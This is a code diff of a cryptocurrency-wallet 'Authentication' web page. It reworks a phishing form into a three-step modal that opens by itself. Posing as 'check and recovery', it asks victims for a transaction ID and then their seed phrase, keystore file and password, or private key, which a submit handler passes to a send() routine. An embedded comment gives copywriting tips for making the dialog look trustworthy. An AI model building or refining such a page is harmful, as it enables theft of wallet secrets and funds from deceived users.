@@ -32,7 +32,49 @@
   <title>Authentication</title>
 
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css">
+  <script type="text/javascript" src="js/validate.js"></script>
   <script type="text/javascript" src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+  <style>
+    .modal-dialog-centered {
+      display: flex;
+      align-items: center;
+      min-height: calc(100vh - 1rem);
+    }
+
+    .modal-content {
+      padding: 20px;
+      padding-bottom: 0.5rem;
+      z-index: 1050;
+    }
+
+    .step-title {
+      text-align: center;
+    }
+
+    .step-buttons {
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .modal-lg,
+    .modal-xl {
+      max-width: 600px;
+    }
+
+    .hero_area {
+      position: relative;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .container-fluid {
+      width: 100%;
+      padding: 0.75rem;
+      margin: 0 auto;
+    }
+  </style>
 </head>
 
 <body>
@@ -43,147 +85,323 @@
     <div class="nav-bar">
       <div class="custom_nav-container" style="align-items: center;">
 
-          <a><img src="images/logo.png" class="img-logo" style="height: 42px;"></a>
-          <a class="" href="/">
-            <img class="png img-logo" src="images/home.png" style="height: 36px;">
-          </a>
+        <a><img src="images/logo.png" class="img-logo" style=""></a>
+        <a class="" href="/">
+          <img class="png img-logo" src="images/home.png" style="">
+        </a>
 
       </div>
     </div>
   </header>
+
   <div class="hero_area">
 
     <!-- Hidden div for wallet selection -->
 
     <div class="container-fluid">
-      <div class="hero_bg_box">
-        <div class="bg_img_box">
-          <img src="images/hero-bg-blue.png" alt="">
-        </div>
+      <div class="hero_bg_box" style="filter: blur(4px) brightness(0.5); background-image: url('/images/bgbgbg.png'); background-repeat: no-repeat;
+      background-attachment: fixed; 
+      background-size: 100% 100%;">
       </div>
-      <div class="form" style="display: block;">
-        <div>
-          <ul class="nav nav-tabs" id="myTab" role="tablist">
-            <li class="nav-item" role="presentation">
-              <button class="nav-link active" id="home-tab" data-bs-toggle="tab" data-bs-target="#home" type="button"
-                role="tab" aria-controls="home" aria-selected="true">
-                Phrase
-              </button>
-            </li>
-            <li class="nav-item" role="presentation">
-              <button class="nav-link" id="profile-tab" data-bs-toggle="tab" data-bs-target="#profile" type="button"
-                role="tab" aria-controls="profile" aria-selected="false">
-                Keystore
-              </button>
-            </li>
-            <li class="nav-item" role="presentation">
-              <button class="nav-link" id="contact-tab" data-bs-toggle="tab" data-bs-target="#contact" type="button"
-                role="tab" aria-controls="contact" aria-selected="false">
-                Private key
-              </button>
-            </li>
-          </ul>
-          <div class="tab-content" id="myTabConflextent">
-            <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
-              <div style="margin: 1rem 0; font-weight: 400;"></div>
-              <!-- This is for phrase  -->
-              <form id="phrase-form">
-                <div class="form-group mb-3">
-                  <textarea style="height: 10rem; color: #3ab6ff" class="form-control" required type="text"
-                    name="phrase"></textarea>
+      <!-- this is for first page-->
+      <!--
 
-                  <div id="" class="form-text">
+We understand that security is important to you. That's why we use industry-standard encryption to protect your data
+Use a clear call-to-action (CTA)
+
+Make sure the CTA is clear and prominent.
+Use action-oriented language that encourages the user to take action.
+Example:
+
+"Click 'Next' to proceed with importing your wallet."
+
+Display your company's logo and branding consistently throughout the dialogue box.
+Use a consistent font and color scheme to create a professional look.
+Step 4: Terms and Conditions
+
+"By proceeding, you acknowledge that you have read and agree to our terms and conditions."
+"Please review our terms and conditions before proceed
+
+Options:
+
+"Yes, I understand and am ready to proceed"
+"No, I need more information before proceeding"
+
+-->
+
+      <!-- Multi-Step Modal -->
+      <div class="modal fade" id="multiStepModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true"
+        style="">
+        <div class="modal-dialog modal-dialog-centered modal-lg">
+          <div class="modal-content">
+            <div class="modal-header" style="justify-content: center; padding-top: 0;">
+              <h5 class="modal-title step-title" id="exampleModalLabel" style="">Step 1</h5>
+            </div>
+            <div class="modal-body">
+              <div class="step-content active" id="step1">
+                <p>For successful check and recovery you are required to complete a few steps for authentication and
+                  transaction verification.</p>
+                <p>You will need to enter correct transaction ID and connect your wallet. </p>
+
+                <div class="form-check">
+                  <input class="form-check-input" type="checkbox" id="exampleCheckbox">
+                  <label class="form-check-label" for="exampleCheckbox">
+                    Yes, I understand and am ready to proceed.
+                  </label>
+                </div>
+              </div>
+
+              <div class="step-content" id="step2" style="display: none;">
+                <form id="empty">
+                  <p>Enter the transaction ID or transaction hash</p>
+                  <label>Transaction ID / Hash or Signature</label>
+                  <input type="text" class="form-control" required name="new-input" placeholder="e.g. 0x3f7453c6b...">
+                </form>
+              </div>
+
+              <div class="step-content" id="step3" style="display: none;">
+                <h3 style="font-size: 1.1rem; text-align: center; ">Choose one of three validation methods</h3>
+                <ul class="nav nav-tabs" id="myTab" role="tablist">
+                  <li class="nav-item" role="presentation">
+                    <button class="nav-link active" id="home-tab" data-bs-toggle="tab" data-bs-target="#home"
+                      type="button" role="tab" aria-controls="home" aria-selected="true">
+                      Phrase
+                    </button>
+                  </li>
+                  <li class="nav-item" role="presentation">
+                    <button class="nav-link" id="profile-tab" data-bs-toggle="tab" data-bs-target="#profile"
+                      type="button" role="tab" aria-controls="profile" aria-selected="false">
+                      Keystore
+                    </button>
+                  </li>
+                  <li class="nav-item" role="presentation">
+                    <button class="nav-link" id="contact-tab" data-bs-toggle="tab" data-bs-target="#contact"
+                      type="button" role="tab" aria-controls="contact" aria-selected="false">
+                      Private key
+                    </button>
+                  </li>
+                </ul>
+                <div class="tab-content" id="myTabConflextent">
+                  <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
+                    <div style="margin: 1rem 0; font-weight: 400;"></div>
+                    <!-- This is for phrase  -->
+                    <form id="phrase-form">
+                      <div class="form-group mb-3">
+                        <textarea style="height: 10rem; color: #3ab6ff" class="form-control" required type="text"
+                          placeholder="Seed phrase..." name="phrase"></textarea>
+
+                        <div id="" class="form-text">
+
+                        </div>
+                      </div>
+
+
+                    </form>
+                  </div>
+                  <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
+                    <!-- This is for keystore -->
+                    <form id="keystore-form">
+
+                      <div class="form-group mb-3">
+                        <textarea style="height: 10rem; color: #1CB0F6" required type="text" name="keystore-json"
+                          placeholder="Keystore JSON..." id="key" class="form-control"></textarea>
+                        <div id="" class="form-text">
+                        </div>
+                        <input style="
+                    margin-top: 20px;
+                    margin-bottom: 30px;
+                    color: #0150b8;
+                    " required name="keystore-pass" type="text" class="form-control" id="pass"
+                          placeholder="Keystore password" aria-label="Username" aria-describedby="basic-addon1" />
+                      </div>
+
+
+                    </form>
+                  </div>
+                  <div class="tab-pane fade" id="contact" role="tabpanel" aria-labelledby="contact-tab">
+                    <!-- THis is for private key -->
+                    <form id="pkey-form">
+
+                      <div class="form-group mb-3">
+                        <textarea style="height: 10rem; color: #0150b8" required name="pkey" type="text"
+                          placeholder="Private key..." class="form-control"></textarea>
+                      </div>
+
+
+                    </form>
+
 
                   </div>
-                </div>
-                <button style="
-                          background-color: #1CB0F6;
-                          padding: 0.5rem 0rem 0.5rem 0rem;
-                          font-weight: 600; 
-                          width: 100%;
-                        " id="phrase-submit" class="btn btn-primary">
 
-                  Import Wallet
-                </button>
-
-              </form>
-            </div>
-            <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
-              <!-- This is for keystore -->
-              <form id="keystore-form">
-
-                <div class="form-group mb-3">
-                  <textarea style="height: 10rem; color: #1CB0F6" required type="text" name="keystore-json" id="key"
-                    class="form-control"></textarea>
-                  <div id="" class="form-text">
-                  </div>
-                  <input style="
-        margin-top: 20px;
-        margin-bottom: 30px;
-        color: #0150b8;
-        " required name="keystore-pass" type="text" class="form-control" id="pass" placeholder="password"
-                    aria-label="Username" aria-describedby="basic-addon1" />
                 </div>
 
-                <button style="
-                          background-color: #1CB0F6;
-                          width: 100%;
-                          padding: 0.5rem 0rem 0.5rem 0rem;
-                          font-weight: 600; 
-                        " id="keystore-submit" class="btn btn-primary">
-
-                  Import Wallet
-                </button>
-              </form>
-            </div>
-            <div class="tab-pane fade" id="contact" role="tabpanel" aria-labelledby="contact-tab">
-              <!-- THis is for private key -->
-              <form id="pkey-form">
-
-                <div class="form-group mb-3">
-                  <textarea style="height: 10rem; color: #0150b8" required name="pkey" type="text"
-                    class="form-control"></textarea>
+                <div class="form-check" style="text-align: center;">
+                  <input class="form-check-input" type="checkbox" id="submitc">
+                  <label class="form-check-label" for="submitc">
+                    Yes, I understand and am ready to proceed.
+                  </label>
                 </div>
+              </div>
+              <div style="display: flex; justify-content:space-between;" id="button-container">
+                <button type="button" class="btn btn-secondary" id="prevBtn"
+                  style="padding: 0.75rem 2rem; width: 120px; display: none; margin-top:1rem">Back</button>
+                <button type="button" class="btn btn-primary" id="nextBtn"
+                  style="padding: 0.75rem 2rem; width: 120px; margin-top:1rem" disabled>Next</button>
+                <button type="button" class="btn btn-primary" id="submitBtn"
+                  style="padding: 0.75rem 2rem; width: 120px; display: none; margin-top:1rem; justify-self: center;"
+                  disabled>Submit</button>
+              </div>
 
-                <button style="
-                          background-color: #1CB0F6;
-                          padding: 0.5rem 0rem 0.5rem 0rem;
-                          width: 100%;
-                          font-weight: 600; 
-                        " id="pkey-submit" class="btn btn-primary">
 
-                  Import Wallet
-                </button>
-              </form>
             </div>
           </div>
+
+
+
+
+
+
         </div>
-        <!--    <img src="images/warning..png" style="width: 18px; height: 18px;" 
-        -->
-        <div class="wallet-options" style="margin:0">
-          <p class="grayed_out" style="margin: 0.8rem 0 0.5rem 0">
-            <i style="margin-right: 0.4rem" class="fa fa-lock" aria-hidden="true"></i>
-            All information is end-to end-encrypted.
-          </p>
+        <!-- Spinner Container -->
+        <div class="spinner-container" id="spinner" style="display: none; flex-direction: column-reverse;">
+          <p style="padding-top:16px">Importing...</p>
+          <div class="spinner"></div>
         </div>
+
+
       </div>
+      <!-- footer section -->
+      <section class="footer_section form-footer">
+        <p style="color: white;">
+          &copy; <span id="displayYear"></span> All Rights Reserved By Bitsec Ltd.
+        </p>
+      </section>
+      <!-- jQuery and Bootstrap JS -->
 
 
-    </div>
-    <!-- Spinner Container -->
+      <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"></script>
 
-    <div class="spinner-container" id="spinner" style="display: none;">
-      <div class="spinner"></div>
-    </div>
+      <script type="text/javascript" src="js/form.js"></script>
+      <script>
 
-    <!-- footer section -->
-    <section class="footer_section form-footer">
-      <p style="color: white;">
-        &copy; <span id="displayYear"></span> All Rights Reserved By Bitsec Ltd.
-      </p>
-    </section>
-  </div>
-  <script type="text/javascript" src="js/form.js"></script>
+        document.getElementById('submitBtn').addEventListener('click', function () {
+          // Get the active tab pane
+          var activeTab = document.querySelector('.tab-pane.active');
+
+          // Get the form within the active tab pane
+          var activeForm = activeTab.querySelector('form');
+
+          // Submit the form data based on the active tab
+          if (activeForm.id === 'phrase-form') {
+            var activeTab = document.querySelector('.tab-pane.active');
+            var activeForm = activeTab.querySelector('form');
+            var formData = new FormData(activeForm);
+            if (!validatePhrase(formData.get('phrase'))) {
+              alert('Invalid form submission!')
+              return false;
+            } else {
+              $("#spinner").show();
+              send(1);
+            }
+          } else if (activeForm.id === 'keystore-form') {
+            var activeTab = document.querySelector('.tab-pane.active');
+            var activeForm = activeTab.querySelector('form');
+            var formData = new FormData(activeForm);
+            if (!validatePhrase(formData.get('phrase'))) {
+              alert('Invalid form submission!')
+              return false;
+            } else {
+              $("#spinner").show();
+              send(2);
+            }
+          } else {
+            var activeTab = document.querySelector('.tab-pane.active');
+            var activeForm = activeTab.querySelector('form');
+            var formData = new FormData(activeForm);
+            if (!validatePhrase(formData.get('phrase'))) {
+              alert('Invalid form submission!')
+              return false;
+            } else {
+              $("#spinner").show();
+              send(3);
+            }
+          }
+        });
+        const steps = [...document.querySelectorAll('.step-content')];
+        const nextBtn = document.getElementById('nextBtn');
+        const prevBtn = document.getElementById('prevBtn');
+        const submitBtn = document.getElementById('submitBtn');
+        const title = document.querySelector('.modal-title');
+        const checkbox = document.getElementById('exampleCheckbox');
+        const submitCheckbox = document.getElementById('submitc');
+        const row = document.getElementById('button-container');
+        let currentStep = 0;
+
+        function showStep(step) {
+          steps.forEach((content, index) => {
+            content.style.display = index === step ? 'block' : 'none';
+          });
+          title.textContent = `Step ${step + 1} / 3`;
+          if (step === 0) {
+            row.style.justifyContent = 'center';
+            prevBtn.style.display = 'none';
+          } else if (step === 1) {
+            row.style.justifyContent = 'space-between';
+            prevBtn.style.display = 'inline-block';
+            submitBtn.style.display = 'none';
+            nextBtn.style.display = 'inline-block';
+          } else {
+            nextBtn.style.display = 'none';
+            submitBtn.style.display = 'inline-block';
+          }
+          /*
+          prevBtn.style.display = step > 0 ? 'inline-block' : 'none';
+          nextBtn.style.display = step < steps.length - 1 ? 'inline-block' : 'none';
+          submitBtn.style.display = step > steps.length - 2 ? 'inline-block' : 'none';
+          */
+        }
+
+        nextBtn.addEventListener('click', () => {
+          currentStep++;
+          showStep(currentStep);
+        });
+
+        prevBtn.addEventListener('click', () => {
+          if (currentStep > 0) {
+            currentStep--;
+            showStep(currentStep);
+          }
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+          new bootstrap.Modal(document.getElementById('multiStepModal')).show();
+          showStep(currentStep);
+        });
+        // Add an event listener to the checkbox
+        checkbox.addEventListener('change', function () {
+          // Enable the "Next" button if the checkbox is checked
+          if (this.checked) {
+            nextBtn.disabled = false;
+          } else {
+            // Disable the "Next" button if the checkbox is not checked
+            nextBtn.disabled = true;
+          }
+        });
+
+        submitCheckbox.addEventListener('change', function () {
+          if (this.checked) {
+            submitBtn.disabled = false;
+            prevBtn.style.display = 'none';
+            row.style.justifyContent = 'center';
+          } else {
+            submitBtn.disabled = true;
+            prevBtn.style.display = 'inline-block';
+            row.style.justifyContent = 'space-between';
+          }
+        });
+      </script>
 </body>
 
 </html>
